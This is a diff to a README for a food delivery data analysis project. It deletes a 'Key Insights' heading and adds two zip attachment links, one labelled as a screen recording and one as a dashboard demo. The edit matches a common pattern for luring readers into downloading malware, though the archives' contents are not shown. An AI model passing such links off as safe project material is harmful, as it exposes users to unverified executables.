@@ -34,8 +34,12 @@ The goal of this project is to help restaurants and food delivery businesses mak
 - GitHub – Project Repository
 
 ---
+[Screen Recording 2026-07-06 213135.zip](https://github.com/user-attachments/files/30010420/Screen.Recording.2026-07-06.213135.zip)
 
-## 🎯 Key Insights
+
+
+
+
 
 - Identified the most popular cuisines among customers.
 - Compared order trends across different cities.
@@ -54,4 +58,5 @@ The goal of this project is to help restaurants and food delivery businesses mak
 
 **Mohana Bhavya Vattikuti**
 
-GitHub Repository: [Food_Delivery_Analysis](https://github.com/mohanabhavyavattikuti-214/Food_Delivery_Analysis)
+GitHub Repository: [Food_Delivery_Analysis](https://github.com/mohanabhavyavattikuti-214/Food_Delivery_Analysis)[Food_Delivery_Dashboard_Demo.zip](https://github.com/user-attachments/files/30010447/Food_Delivery_Dashboard_Demo.zip)
+
